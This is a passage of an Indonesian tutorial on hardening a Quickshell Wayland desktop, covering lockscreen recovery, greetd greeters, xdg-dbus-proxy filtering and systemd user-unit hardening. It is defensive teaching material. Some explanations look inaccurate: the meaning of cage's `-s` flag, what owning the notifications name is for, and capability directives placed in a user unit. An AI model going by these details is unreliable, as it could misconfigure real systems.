- **Periksa `secure` sebelum menganggap sesi aman.** `locked = true` hanyalah permintaan; `secure = true` adalah konfirmasi dari compositor.
- **Gunakan `echoMode: TextInput.Password`.** Ini mencegah shoulder surfing.
- **Pertimbangkan `pam_faillock` dengan hati-hati.** Untuk lockscreen, lockout bisa menjadi bumerang. Jika Anda menggunakannya, **siapkan prosedur pemulihan** (`faillock --reset` dari TTY).

---

## 15. Potensi Kesalahan Umum & Solusi

| Kesalahan | Solusi |
|---|---|
| **Lupa `focus: true` pada `TextInput`.** | Tanpa fokus, pengguna tidak bisa mengetik. Selalu set `focus: true` pada input kata sandi. |
| **Menggunakan `console.log(root.currentText)` untuk debugging.** | **Jangan pernah.** Gunakan `console.log("Auth started")` atau log status **tanpa** kata sandi. |
| **Tidak mengosongkan `currentText` setelah autentikasi.** | Tambahkan `root.currentText = ''` di `onCompleted`, **sebelum** memeriksa hasil. |
| **Menggunakan `WlrKeyboardFocus.Exclusive` sebagai pengganti lockscreen.** | Ini **bukan** mekanisme keamanan. Gunakan `WlSessionLock`. |
| **Tidak menguji crash.** | `kill -9` Quickshell saat terkunci untuk memastikan sesi tetap terkunci. |
| **Menggunakan `--unshare-net` pada shell yang menjalankan lockscreen, lalu bingung mengapa PAM tidak berfungsi.** | PAM memerlukan akses ke `/etc/pam.d` dan socket PAM (biasanya `/run/pam`). Pastikan bind mount yang sesuai. |
| **Lupa bahwa `pam_faillock` ada di `system-auth`.** | Periksa `/etc/pam.d/system-auth` di Arch; jika ada `pam_faillock`, lockscreen Anda juga akan terkena lockout. |
| **Tidak memiliki TTY cadangan.** | Uji `Ctrl+Alt+F2` **sebelum** mengunci. Jika tidak berfungsi, jangan mengunci. |
| **Menganggap `locked = true` berarti sesi aman.** | Periksa `secure`. Jika `false`, ada layar yang belum tertutup. |

---

## 16. Latihan dan Checkpoint

### 16.1 Latihan (Sesuai Kurikulum Asli)

1.  **Bangun lockscreen di VM.**
2.  **Pastikan semua monitor tertutup** saat `locked = true`.
3.  **`kill -9` proses Quickshell** saat terkunci.
4.  **Buktikan sesi tetap terkunci.**
5.  **Pulihkan sesi dari TTY** menggunakan prosedur di Bagian 8.

### 16.2 Checkpoint

**Pertanyaan 1:** Jelaskan perbedaan `WlSessionLock` dan `WlrKeyboardFocus.Exclusive`.

**Jawaban singkat:** `WlSessionLock` menggunakan protokol `ext-session-lock-v1` di mana **compositor** yang mengunci sesi—input dan tampilan klien lain ditahan, dan jika klien mati, sesi **tetap terkunci** (fail-safe). `WlrKeyboardFocus.Exclusive` hanya **memfokuskan keyboard** ke suatu permukaan; ia **tidak** menyembunyikan jendela lain dan **tidak** fail-safe. Jika klien yang memiliki fokus mati, fokus hilang dan desktop kembali terlihat. `WlrKeyboardFocus.Exclusive` berguna untuk fokus input, **bukan** untuk keamanan.

**Pertanyaan 2:** Tunjukkan prosedur pemulihan dari TTY.

**Jawaban singkat:**
1.  Tekan `Ctrl+Alt+F2` untuk masuk ke TTY.
2.  Login dengan nama pengguna dan kata sandi.
3.  `killall quickshell` (atau `killall -9 quickshell` jika perlu).
4.  Jika Hyprland: `hyprctl keyword misc:allow_session_lock_restore 1`, lalu jalankan ulang `quickshell -c lock &`.
5.  Jika `pam_faillock` lockout: `faillock --user username --reset`.
6.  Jika lupa kata sandi: `passwd username` (memerlukan root).

---

## 🎯 Motivasi

> *"Lockscreen adalah cermin kepercayaan Anda pada sistem: ia harus bekerja tanpa Anda pikirkan, tetapi ketika gagal, ia harus gagal dengan cara yang melindungi—bukan mengkhianati. Bangunlah dengan hati-hati, ujilah dengan berani, dan tidurlah dengan tenang."*

---

## ✅ Modul 4.2 telah selesai dibahas secara komprehensif, mencakup:

- Deskripsi konkret dan peran dalam kurikulum
- Filosofi fail-safe dan mengapa `WlrKeyboardFocus.Exclusive` bukan pengganti
- Protokol `ext-session-lock-v1` dan perilaku compositor
- `WlSessionLock` dan `WlSessionLockSurface` (properti, multi-monitor, `secure`)
- `PamContext` (start, pamMessage, respond, completed, PamResult)
- Konfigurasi PAM khusus (`/etc/pam.d/quickshell-lock`), termasuk opsi tanpa `pam_faillock` dan dengan fingerprint
- Penanganan kredensial (pembersihan memori, anti-log)
- **[TAMBAHAN]** Prosedur pemulihan (TTY, `allow_session_lock_restore`, `faillock --reset`, reset kata sandi)
- Audit keamanan lockscreen
- Terminologi, visualisasi, referensi, tips, kesalahan umum, latihan, dan checkpoint

Sekarang kita akan melanjutkan ke **Modul 4.3**. Ini adalah modul penutup Fase 4 yang menyatukan semuanya: setelah Anda mengisolasi proses (4.1) dan mengamankan komponen kritis (4.2), kini saatnya membangun **pintu masuk** (greetd), **membatasi jalur komunikasi** (D-Bus), dan **mengeraskan fondasi sesi** (systemd hardening)—serta memahami cara **keluar dari kurungan** yang Anda buat sendiri.

---

# MODUL 4.3 — Greetd, Hardening Sesi, dan Penyaringan D-Bus

## 📋 Daftar Isi Modul 4.3

1.  Deskripsi Konkret & Peran dalam Kurikulum
2.  Arsitektur Greetd: Greeter, IPC, dan Peluncuran Sesi
3.  `cage`: Compositor Kios untuk Greeter
4.  `Quickshell.Services.Greetd`: Autentikasi dan Peluncuran Sesi
5.  Menyaring D-Bus dengan `xdg-dbus-proxy`
6.  Hardening Unit `systemd --user` dan Pewarisan ke Proses Anak
7.  Meluncurkan Aplikasi di Luar Kurungan Shell
8.  **[TAMBAHAN]** Audit dengan `systemd-analyze security`
9.  Terminologi Esensial
10. Visualisasi: Peta Arsitektur Modul 4.3
11. Hubungan dengan Modul Lain
12. Sumber Referensi
13. Tips dan Praktik Terbaik
14. Potensi Kesalahan Umum & Solusi
15. Latihan dan Checkpoint

---

## 1. Deskripsi Konkret & Peran dalam Kurikulum

Modul ini menutup Fase 4 dengan tiga pilar:

1.  **Greetd** — login manager minimalis yang menjalankan **greeter** (Quickshell) sebagai pengguna terbatas, lalu meluncurkan sesi pilihan setelah autentikasi berhasil.
2.  **`xdg-dbus-proxy`** — penyaring D-Bus yang memungkinkan shell hanya berkomunikasi dengan layanan yang diizinkan, bukan seluruh bus sesi.
3.  **Hardening systemd user unit** — direktif seperti `NoNewPrivileges`, `RestrictAddressFamilies`, dan `PrivateTmp` yang membatasi kemampuan shell (dan **proses anaknya**).

**Mengapa ini krusial?** Modul 4.1 mengajarkan Anda **mengisolasi helper**. Modul 4.2 mengamankan **lockscreen**. Modul 4.3 memastikan bahwa **seluruh siklus hidup sesi**—dari login hingga logout—berjalan dengan **hak akses minimum**. Tanpa modul ini, shell Anda mungkin aman saat terkunci, tetapi **terbuka lebar** saat berjalan.

---

## 2. Arsitektur Greetd: Greeter, IPC, dan Peluncuran Sesi

### 2.1 Konsep Kunci & Filosofi

**Analogi:** Greetd adalah **penjaga pintu depan** gedung. Ia tidak peduli apakah Anda ingin masuk ke kantor, gudang, atau ruang server—ia hanya memverifikasi identitas Anda, lalu **membukakan pintu yang Anda pilih**. Greeter (Quickshell) adalah **meja resepsionis**: tampilan yang Anda lihat, tempat Anda mengetik kata sandi. Setelah autentikasi, greetd **mengakhiri** greeter dan **meluncurkan sesi** Anda.

**Filosofi inti:** **Pemisahan kekuasaan.** Greeter berjalan sebagai pengguna terbatas (biasanya `greeter`), **bukan** sebagai pengguna Anda dan **bukan** sebagai root. Greeter tidak memiliki akses ke home directory Anda, tidak bisa membaca kunci SSH Anda, dan tidak bisa menjalankan perintah sebagai Anda. Ia hanya bisa **berbicara dengan greetd** melalui IPC (Unix socket) untuk meminta autentikasi dan peluncuran sesi.

**Alur kerja greetd:**

```text
Boot
  │
  ▼
greetd (daemon, berjalan sebagai root atau user khusus)
  │
  ▼
Menjalankan greeter (Quickshell) sebagai user "greeter"
  │
  ▼
[Greeter menampilkan UI login]
  │
  ▼
Pengguna mengetik username + password
  │
  ▼
Greeter → IPC → greetd: "Autentikasi user X dengan password Y"
  │
  ▼
greetd → PAM: verifikasi
  │
  ├──► Gagal: kirim pesan error ke greeter
  │
  └──► Berhasil: greetd mengakhiri greeter
            │
            ▼
       greetd meluncurkan sesi (Hyprland, Sway, dll.)
       sebagai user X
```

### 2.2 Konfigurasi `/etc/greetd/config.toml`

```toml
# /etc/greetd/config.toml
[terminal]
vt = 1

[default_session]
command = 'cage -s -- quickshell -p /etc/xdg/quickshell/greeter'
user = 'greeter'
```

**Penjelasan kata demi kata:**

| Baris | Penjelasan |
|---|---|
| `[terminal]` | Bagian konfigurasi untuk terminal virtual (VT). |
| `vt = 1` | Greetd akan berjalan di **VT 1** (tty1). Ini berarti login manager muncul di layar pertama. Anda masih bisa beralih ke VT lain dengan `Ctrl+Alt+F2`, dll. |
| `[default_session]` | Bagian konfigurasi untuk sesi default (greeter). |
| `command = 'cage -s -- quickshell -p /etc/xdg/quickshell/greeter'` | Perintah yang dijalankan untuk greeter. **`cage`** adalah compositor kios (lihat Bagian 3). **`-s`** adalah opsi cage untuk "single application" (kiosk mode). **`--`** memisahkan opsi cage dari perintah yang dijalankan. **`quickshell -p /etc/xdg/quickshell/greeter`** menjalankan Quickshell dengan konfigurasi greeter di path tersebut. |
| `user = 'greeter'` | **Kritis:** Greeter dijalankan sebagai pengguna `greeter`, **bukan** root. Ini adalah prinsip least privilege. Pengguna `greeter` harus dibuat terlebih dahulu (`useradd -r -s /usr/bin/nologin greeter` atau serupa). |

**Mengapa `user = 'greeter'` penting?** Jika greeter dijalankan sebagai root, maka **setiap kerentanan** di Quickshell atau QML greeter akan memberikan penyerang **akses root penuh**. Dengan pengguna terbatas, kerentanan hanya memberikan akses ke akun `greeter` yang **tidak memiliki hak istimewa**.

### 2.3 [TAMBAHAN] Membuat Pengguna `greeter`

```bash
# Buat pengguna sistem untuk greeter (tanpa home, tanpa shell login)
sudo useradd -r -s /usr/bin/nologin -d /var/lib/greetd greeter

# Pastikan direktori konfigurasi greetd dimiliki oleh greeter (atau root, tergantung kebutuhan)
sudo chown -R greeter:greeter /etc/greetd  # HATI-HATI: ini memberi greeter akses tulis ke konfigurasi
```

**Penjelasan:**
- `-r`: Membuat **system user** (UID di bawah 1000).
- `-s /usr/bin/nologin`: Shell tidak valid—pengguna tidak bisa login secara interaktif.
- `-d /var/lib/greetd`: Home directory (opsional, bisa juga `/`).

**Peringatan:** Memberikan `chown greeter:greeter /etc/greetd` memungkinkan greeter **memodifikasi konfigurasinya sendiri**. Ini **tidak disarankan**. Lebih baik biarkan `/etc/greetd` dimiliki `root:root` dan hanya berikan greeter akses **baca** jika diperlukan.

---

## 3. `cage`: Compositor Kios untuk Greeter

### 3.1 Konsep Kunci

**Cage** adalah compositor Wayland **minimalis** yang menjalankan **satu aplikasi fullscreen** (kiosk mode). Ia tidak memiliki panel, workspace, atau fitur desktop lainnya. Tujuannya adalah menyediakan **lingkungan Wayland** yang cukup untuk greeter, tanpa kompleksitas compositor penuh seperti Hyprland atau Sway.

**Mengapa menggunakan cage?**
- **Minimal:** Permukaan serangan kecil. Tidak ada fitur yang tidak perlu.
- **Kiosk:** Greeter tidak bisa "keluar" ke desktop—hanya ada satu aplikasi.
- **Ringan:** Cepat dimuat, cocok untuk boot.

**Alternatif:** Anda bisa menggunakan Sway atau compositor lain, tetapi cage adalah pilihan yang paling sederhana untuk greeter.

### 3.2 Konfigurasi Cage untuk Quickshell

Baris dari konfigurasi greetd:

```toml
command = 'cage -s -- quickshell -p /etc/xdg/quickshell/greeter'
```

**Penjelasan:**
- `cage`: Menjalankan compositor kios.
- `-s`: **Single application mode**. Cage akan menjalankan **satu** aplikasi dan keluar ketika aplikasi tersebut berhenti.
- `--`: Memisahkan opsi cage dari perintah yang akan dijalankan.
- `quickshell -p /etc/xdg/quickshell/greeter`: Quickshell dengan konfigurasi greeter.

**Apa yang terjadi saat autentikasi berhasil?** Quickshell (greeter) memanggil `Greetd.launch([...])`, yang memberi tahu greetd untuk meluncurkan sesi. Greetd kemudian **mengakhiri** greeter (Quickshell) dan **menggantikannya** dengan sesi yang dipilih. Cage, sebagai compositor greeter, juga berakhir.

---

## 4. `Quickshell.Services.Greetd`: Autentikasi dan Peluncuran Sesi

### 4.1 Properti, Fungsi, dan Signal

Berdasarkan dokumentasi resmi Quickshell:

| Properti / Fungsi / Signal | Deskripsi |
|---|---|
| **`available : bool`** (readonly) | Apakah socket greetd tersedia. |
| **`user : string`** (readonly) | Pengguna yang sedang diautentikasi. |
| **`state : GreetdState`** (readonly) | Status koneksi greetd. |
| **`createSession(user) : void`** | Membuat sesi greetd untuk pengguna yang diberikan. Memulai percakapan autentikasi. |
| **`respond(response) : void`** | Merespons pesan autentikasi. **Hanya boleh dipanggil** jika `authMessage()` memiliki `responseRequired = true`. |
| **`launch(command) : void`** | Meluncurkan sesi dan **keluar dari Quickshell**. `state` harus `ReadyToLaunch`. |
| **`launch(command, environment) : void`** | Sama seperti di atas, dengan environment variables. |
| **`launch(command, environment, quit) : void`** | Sama seperti di atas, dengan opsi `quit` (default `true`). |
| **`cancelSession() : void`** | Membatalkan sesi aktif. |
| **`authMessage(message, error, responseRequired, echoResponse)`** (signal) | Pesan autentikasi dari greetd. **`responseRequired`** menunjukkan apakah perlu `respond()`. **`echoResponse`** menunjukkan apakah respons harus terlihat (untuk password, `false`). |
| **`authFailure(message)`** (signal) | Autentikasi gagal (mis. kata sandi salah, timeout). |
| **`readyToLaunch()`** (signal) | Autentikasi berhasil; sesi siap diluncurkan. |
| **`error(error)`** (signal) | Greetd mengalami error. |
| **`launched()`** (signal) | Greetd mengakui permintaan peluncuran; greeter harus segera keluar. |

### 4.2 `GreetdState`: Enum Status

| Nilai | Arti |
|---|---|
| **`Inactive`** | Tidak ada sesi aktif. |
| **`Authenticating`** | Sedang dalam proses autentikasi. |
| **`ReadyToLaunch`** | Autentikasi berhasil; sesi siap diluncurkan. |
| **`Launching`** | Sesi sedang diluncurkan. |
| **`Launched`** | Sesi telah diluncurkan. |

### 4.3 Kode Greeter: Kerangka Lengkap

Berikut adalah kerangka dari materi asli, dengan **penjelasan kata demi kata** yang lebih rinci.

```qml
// Greeter (kerangka; cocokkan nama sinyal dan fungsi dengan referensi Quickshell.Services.Greetd)
import Quickshell.Services.Greetd
import QtQuick

Connections {
    target: Greetd
    function onAuthMessage(message, error, responseRequired, echoResponse) {
        if (responseRequired) Greetd.respond(root.currentText)
    }
    function onReadyToLaunch() { Greetd.launch(['Hyprland']) }
    function onAuthFailure(message) { root.statusText = 'Gagal'; root.currentText = '' }
}
// memulai: Greetd.createSession('nama_pengguna')
```

**Penjelasan baris demi baris:**

| Baris | Penjelasan |
|---|---|
| `import Quickshell.Services.Greetd` | Mengimpor singleton `Greetd` dan tipe terkait (`GreetdState`). |
| `import QtQuick` | Mengimpor tipe dasar QML (meskipun dalam cuplikan ini tidak banyak digunakan, biasanya diperlukan untuk UI). |
| `Connections { target: Greetd ... }` | Objek yang menghubungkan **signal** dari `Greetd` ke **handler** di QML. `target: Greetd` berarti kita mendengarkan signal dari singleton `Greetd`. |
| `function onAuthMessage(message, error, responseRequired, echoResponse) { ... }` | **Handler** untuk signal `authMessage`. Parameter: `message` (teks pesan), `error` (apakah ini pesan error), `responseRequired` (apakah perlu respons), `echoResponse` (apakah respons terlihat). |
| `if (responseRequired) Greetd.respond(root.currentText)` | Jika greetd meminta respons (mis. kata sandi), kirim `root.currentText`. **Catatan:** `root.currentText` harus didefinisikan di tempat lain (mis. di `Scope` atau `Item` induk). |
| `function onReadyToLaunch() { Greetd.launch(['Hyprland']) }` | **Handler** untuk signal `readyToLaunch`. Saat autentikasi berhasil, luncurkan sesi `Hyprland`. **Argumen `launch` adalah array**—perintah dan argumennya. |
| `function onAuthFailure(message) { root.statusText = 'Gagal'; root.currentText = '' }` | **Handler** untuk signal `authFailure`. Tampilkan pesan error dan **kosongkan kata sandi** (praktik keamanan yang sama seperti lockscreen). |
| `// memulai: Greetd.createSession('nama_pengguna')` | Komentar yang menunjukkan cara **memulai** autentikasi: panggil `Greetd.createSession('username')` (mis. saat pengguna menekan tombol "Login" atau menekan Enter setelah mengetik username). |

### 4.4 [TAMBAHAN] Contoh Greeter yang Lebih Lengkap

```qml
import Quickshell
import Quickshell.Services.Greetd
import QtQuick
import QtQuick.Controls

Scope {
    id: root
    property string currentUsername: ''
    property string currentPassword: ''
    property string statusText: ''
    property bool authenticating: false

    Connections {
        target: Greetd

        function onAuthMessage(message, error, responseRequired, echoResponse) {
            if (responseRequired) {
                // Kirim password (atau respons lain)
                Greetd.respond(root.currentPassword)
            } else if (error) {
                root.statusText = message
            }
        }

        function onReadyToLaunch() {
            // Autentikasi berhasil; luncurkan sesi
            Greetd.launch(['Hyprland'])
        }

        function onAuthFailure(message) {
            root.statusText = 'Login gagal: ' + message
            root.currentPassword = ''
            root.authenticating = false
        }

        function onError(error) {
            root.statusText = 'Error: ' + error
            root.authenticating = false
        }
    }

    Column {
        anchors.centerIn: parent
        spacing: 12

        TextField {
            id: usernameField
            placeholderText: 'Username'
            onAccepted: passwordField.forceActiveFocus()
        }

        TextField {
            id: passwordField
            placeholderText: 'Password'
            echoMode: TextInput.Password
            onAccepted: {
                root.currentUsername = usernameField.text
                root.currentPassword = text
                root.statusText = ''
                root.authenticating = true
                Greetd.createSession(root.currentUsername)
            }
        }

        Button {
            text: 'Login'
            enabled: !root.authenticating
            onClicked: passwordField.onAccepted()
        }

        Text {
            text: root.statusText
            color: 'tomato'
        }
    }
}
```

**Penjelasan tambahan:**
- **Dua field:** Username dan password.
- **`onAccepted` pada password:** Memulai sesi dengan `Greetd.createSession(username)`. Ini memicu `authMessage` dari greetd, yang kemudian kita respons dengan password.
- **`echoMode: TextInput.Password`:** Menyembunyikan password (anti-shoulder-surfing).
- **`authenticating`:** Mencegah pengguna mengklik "Login" berkali-kali saat proses berlangsung.

### 4.5 Hubungan dengan PAM

**Penting:** Greetd **menangani percakapan PAM sendiri**. Anda **tidak** menggunakan `PamContext` di greeter. Sebaliknya, greetd yang berkomunikasi dengan PAM, dan greeter hanya berbicara dengan greetd melalui IPC. Inilah sebabnya mengapa `Quickshell.Services.Greetd` ada—ia adalah **jembatan** antara QML dan greetd, bukan antara QML dan PAM.

---

## 5. Menyaring D-Bus dengan `xdg-dbus-proxy`

### 5.1 Mengapa Bus Sesi Perlu Disaring

**Perbedaan krusial:**

| Aspek | Bus Sistem (`/run/dbus/system_bus_socket`) | Bus Sesi (`$XDG_RUNTIME_DIR/bus`) |
|---|---|---|
| **Kebijakan akses** | **Ada**—didefinisikan dalam `/usr/share/dbus-1/system.d/` dan `/etc/dbus-1/system.d/`. | **Tidak ada**—semua proses pengguna dapat berbicara dengan semua layanan pengguna. |
| **Layanan** | UPower, BlueZ, logind, NetworkManager | Notifikasi, MPRIS, StatusNotifier, **systemd --user** |
| **Risiko** | Dibatasi oleh kebijakan | **Penuh**—proses di dalam sandbox dapat meminta `systemd --user` menjalankan program **di luar sandbox**. |

**Kesimpulan:** Bus sesi **tidak memiliki penghalang kebijakan**. Jika Anda meng-bind socket bus sesi **mentah** ke dalam sandbox, proses di dalamnya dapat:

1.  Meminta `systemd --user` menjalankan perintah **di luar sandbox** (karena `systemd --user` berjalan di host, bukan di sandbox).
2.  Mengakses layanan lain yang tidak seharusnya.
3.  Melakukan **sandbox escape**.

**Solusi:** `xdg-dbus-proxy`—proxy yang **menyaring** pesan berdasarkan **nama layanan** yang diizinkan.

### 5.2 Cara Kerja `xdg-dbus-proxy`

Berdasarkan man page:

> "xdg-dbus-proxy is a filtering proxy for D-Bus connections. Its arguments are one or more ADDRESS-PATH pairs specifying the buses to proxy, with options that specify what filtering to apply."

**Alur:**

```text
Quickshell (di dalam sandbox)
       │
       │  Terhubung ke $XDG_RUNTIME_DIR/qs-bus
       ▼
┌─────────────────────────────────────┐
│  xdg-dbus-proxy (di host)           │
│                                     │
│  Membaca kebijakan:                 │
│  --own=org.freedesktop.Notifications│
│  --talk=org.mpris.MediaPlayer2.*    │
│                                     │
│  Jika pesan diizinkan → teruskan    │
│  Jika tidak → tolak (AccessDenied)  │
└─────────────────────────────────────┘
       │
       ▼
Bus Sesi Asli ($XDG_RUNTIME_DIR/bus)
```

**Tingkat kebijakan** (dari man page):

| Tingkat | Izin |
|---|---|
| **SEE** | Nama/ID terlihat di `ListNames`, `ListActivatableNames`; bisa memanggil `GetNameOwner`, `NameHasOwner`; melihat sinyal `NameOwnerChanged`; bisa mendapatkan PID peer. |
| **TALK** | Semua izin SEE, **plus** dapat mengirim method call dan sinyal ke nama/ID; menerima sinyal broadcast (jika ada match rule); dapat memanggil `StartServiceByName`. |
| **OWN** | Semua izin TALK, **plus** dapat memanggil `RequestName`/`ReleaseName`/`ListQueuedOwners`—yaitu **memiliki** nama tersebut. |

### 5.3 Contoh Konfigurasi

Dari materi asli:

```bash
xdg-dbus-proxy $DBUS_SESSION_BUS_ADDRESS $XDG_RUNTIME_DIR/qs-bus \
  --filter \
  --own=org.freedesktop.Notifications \
  --own=org.kde.StatusNotifierWatcher \
  --talk=org.mpris.MediaPlayer2.*
```

**Penjelasan kata demi kata:**

| Argumen | Penjelasan |
|---|---|
| `xdg-dbus-proxy` | Nama program. |
| `$DBUS_SESSION_BUS_ADDRESS` | **Alamat bus sesi asli** (biasanya `unix:path=/run/user/1000/bus`). Ini adalah **hulu** proxy. |
| `$XDG_RUNTIME_DIR/qs-bus` | **Path socket** yang akan dibuat proxy. Quickshell akan terhubung ke sini, bukan ke bus asli. |
| `--filter` | Mengaktifkan **mode penyaringan**. Tanpa ini, proxy meneruskan semua pesan (tidak berguna untuk keamanan). |
| `--own=org.freedesktop.Notifications` | Mengizinkan Quickshell **memiliki** nama `org.freedesktop.Notifications`. Ini diperlukan agar shell bisa **mengirim notifikasi** (bukan hanya menerima). |
| `--own=org.kde.StatusNotifierWatcher` | Mengizinkan Quickshell memiliki `org.kde.StatusNotifierWatcher`—diperlukan untuk **system tray** (StatusNotifierItem). |
| `--talk=org.mpris.MediaPlayer2.*` | Mengizinkan Quickshell **berbicara** dengan **semua** layanan MPRIS (media player). Tanda `*` adalah wildcard. Quickshell dapat mengirim perintah (play, pause, next) dan menerima sinyal (metadata berubah). |

**Apa yang TIDAK diizinkan?**
- `org.freedesktop.systemd1` — **Tidak** ada di daftar. Quickshell **tidak bisa** meminta systemd menjalankan perintah.
- `org.freedesktop.portal.*` — Tidak diizinkan (kecuali Anda menambahkannya).
- Layanan lain yang tidak disebutkan — **default: SEE** (hanya terlihat, tidak bisa berbicara).

### 5.4 [TAMBAHAN] Contoh Konfigurasi yang Lebih Lengkap

```bash
xdg-dbus-proxy $DBUS_SESSION_BUS_ADDRESS $XDG_RUNTIME_DIR/qs-bus \
  --filter \
  --own=org.freedesktop.Notifications \
  --own=org.kde.StatusNotifierWatcher \
  --own=org.kde.StatusNotifierItem-* \
  --talk=org.mpris.MediaPlayer2.* \
  --talk=org.freedesktop.portal.Desktop \
  --talk=org.freedesktop.UPower \
  --see=org.freedesktop.login1 \
  --call=org.freedesktop.DBus=org.freedesktop.DBus.GetNameOwner
```

**Penjelasan tambahan:**
- `--own=org.kde.StatusNotifierItem-*`: Mengizinkan shell **mendaftarkan** item tray (setiap item memiliki nama unik dengan prefix ini).
- `--talk=org.freedesktop.portal.Desktop`: Diperlukan untuk **portal** (file picker, screenshot, dll.).
- `--talk=org.freedesktop.UPower`: Diperlukan untuk **informasi baterai/daya**.
- `--see=org.freedesktop.login1`: Hanya **melihat** logind (untuk informasi sesi), tetapi **tidak bisa** memanggil method yang sensitif (mis. `PowerOff`).
- `--call=org.freedesktop.DBus=org.freedesktop.DBus.GetNameOwner`: **Izin spesifik** untuk memanggil method tertentu pada bus itu sendiri. Ini lebih granular daripada `--talk`.

### 5.5 [TAMBAHAN] Integrasi dengan `bwrap`

Setelah `xdg-dbus-proxy` berjalan dan membuat socket `$XDG_RUNTIME_DIR/qs-bus`, Anda **bind** socket tersebut ke dalam sandbox:

```bash
--bind $XDG_RUNTIME_DIR/qs-bus $XDG_RUNTIME_DIR/bus
--setenv DBUS_SESSION_BUS_ADDRESS unix:path=$XDG_RUNTIME_DIR/bus
```

**Penjelasan:**
- `--bind ... ...`: Socket proxy di-bind ke path `bus` di dalam sandbox.
- `--setenv ...`: Quickshell di dalam sandbox akan menggunakan path tersebut sebagai alamat D-Bus sesi.

**Jangan bind socket asli.** Jika Anda bind `$XDG_RUNTIME_DIR/bus` (tanpa proxy), semua penyaringan **sia-sia**.

### 5.6 Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **`xdg-dbus-proxy`** | Proxy penyaring D-Bus yang membuat socket baru dan hanya meneruskan pesan yang diizinkan. |
| **`--filter`** | Mode penyaringan (default: teruskan semua). |
| **`--own`** | Izin **memiliki** nama D-Bus (mendaftarkan layanan). |
| **`--talk`** | Izin **berbicara** dengan nama D-Bus (mengirim method call, menerima sinyal). |
| **`--see`** | Izin **melihat** nama D-Bus (terlihat di daftar, bisa cek keberadaan), tetapi **tidak bisa** berbicara. |
| **`--call`** | Izin granular untuk memanggil method tertentu. |

---

## 6. Hardening Unit `systemd --user` dan Pewarisan ke Proses Anak

### 6.1 Mengapa Unit systemd?

Jika Anda menjalankan Quickshell sebagai **service systemd user** (bukan dari terminal), Anda bisa menerapkan **direktif hardening** yang membatasi kemampuan shell di level kernel—tanpa perlu `bwrap`. Ini adalah **lapisan pertahanan tambahan** yang sangat kuat.

**Namun, ada jebakan:** **Direktif sandbox systemd diwariskan ke proses anak.** Jika Anda membatasi `RestrictAddressFamilies=AF_UNIX` pada unit shell, maka **aplikasi yang diluncurkan dari shell** juga hanya bisa menggunakan `AF_UNIX`—**tidak bisa** menggunakan jaringan (`AF_INET`, `AF_INET6`). Ini bisa merusak fungsionalitas browser, email client, dll.

### 6.2 Direktif Hardening yang Relevan

Berdasarkan contoh dari berbagai sumber:

```ini
# ~/.config/systemd/user/quickshell.service
[Unit]
Description=Quickshell Desktop Shell
PartOf=graphical-session.target
After=graphical-session.target

[Service]
Type=simple
ExecStart=/usr/bin/quickshell -c my-shell
Restart=on-failure

# --- Hardening ---
NoNewPrivileges=yes
PrivateTmp=yes
PrivateDevices=yes
RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6
RestrictNamespaces=yes
RestrictRealtime=yes
DevicePolicy=closed
ProtectSystem=full
ProtectControlGroups=yes
ProtectKernelModules=yes
ProtectKernelTunables=yes
LockPersonality=yes
SystemCallFilter=~@clock @debug @module @mount @obsolete @reboot @setuid @swap
CapabilityBoundingSet=~CAP_RAWIO CAP_MKNOD CAP_AUDIT_CONTROL CAP_AUDIT_READ CAP_AUDIT_WRITE
CapabilityBoundingSet=~CAP_SYS_BOOT CAP_SYS_TIME CAP_SYS_MODULE CAP_SYS_PACCT
CapabilityBoundingSet=~CAP_LEASE CAP_LINUX_IMMUTABLE CAP_IPC_LOCK CAP_BLOCK_SUSPEND CAP_WAKE_ALARM
CapabilityBoundingSet=~CAP_SYS_TTY_CONFIG CAP_MAC_ADMIN CAP_MAC_OVERRIDE
CapabilityBoundingSet=~CAP_NET_ADMIN CAP_NET_BROADCAST CAP_NET_RAW
CapabilityBoundingSet=~CAP_SYS_ADMIN CAP_SYS_PTRACE CAP_SYSLOG

[Install]
WantedBy=graphical-session.target
```

**Penjelasan direktif kunci:**

| Direktif | Fungsi | Dampak pada Proses Anak |
|---|---|---|
| **`NoNewPrivileges=yes`** | Mencegah proses mendapatkan hak istimewa baru (mis. melalui file SUID). | **Diwariskan**—aplikasi yang diluncurkan juga tidak bisa menggunakan SUID. |
| **`PrivateTmp=yes`** | Memberikan `/tmp` dan `/var/tmp` **terisolasi** (tmpfs) untuk unit. | **Diwariskan**—aplikasi yang diluncurkan memiliki `/tmp` sendiri, tidak bisa melihat `/tmp` host. |
| **`PrivateDevices=yes`** | Membatasi akses ke perangkat fisik (`/dev`). Hanya perangkat dasar (null, zero, random) yang tersedia. | **Diwariskan**—aplikasi tidak bisa mengakses GPU, webcam, dll. **Hati-hati:** ini bisa merusak Wayland (yang membutuhkan `/dev/dri`). |
| **`RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6`** | Membatasi **family alamat** yang dapat digunakan proses. | **Diwariskan**—jika Anda hanya mengizinkan `AF_UNIX`, aplikasi **tidak bisa** menggunakan jaringan. |
| **`RestrictNamespaces=yes`** | Mencegah proses membuat namespace baru. | **Diwariskan**—aplikasi tidak bisa menggunakan `bwrap` sendiri (kecuali diizinkan). |
| **`DevicePolicy=closed`** | Menutup akses ke semua perangkat kecuali yang secara eksplisit diizinkan. | **Diwariskan**. |
| **`ProtectSystem=full`** | Membuat `/usr`, `/boot`, `/etc` **read-only**. | **Diwariskan**—aplikasi tidak bisa memodifikasi sistem. |
| **`SystemCallFilter=~@...`** | **Memblokir** grup syscall tertentu. | **Diwariskan**—aplikasi tidak bisa menggunakan syscall tersebut. |

### 6.3 Jebakan: `RestrictAddressFamilies` dan Aplikasi yang Diluncurkan

**Skenario:** Anda menetapkan `RestrictAddressFamilies=AF_UNIX` pada unit shell. Shell berjalan dengan baik (hanya menggunakan Unix socket untuk Wayland dan D-Bus). Tetapi ketika Anda meluncurkan **Firefox** dari launcher shell:

```text
Firefox → mencoba socket AF_INET (TCP/IP) → DITOLAK (EPERM)
```

**Hasil:** Firefox tidak bisa mengakses internet. Ini adalah **perilaku yang benar** secara keamanan—tetapi **merusak fungsionalitas**.

**Solusi:** Lihat Bagian 7 (Meluncurkan Aplikasi di Luar Kurungan Shell).

### 6.4 [TAMBAHAN] `ProtectHome` dan Akses Filesystem

`ProtectHome` adalah direktif kuat yang membatasi akses ke home directory:

```ini
ProtectHome=yes          # /home, /root, /run/user tidak terlihat
# atau
ProtectHome=read-only    # hanya baca
# atau
ProtectHome=tmpfs        # /home kosong (tmpfs)
```

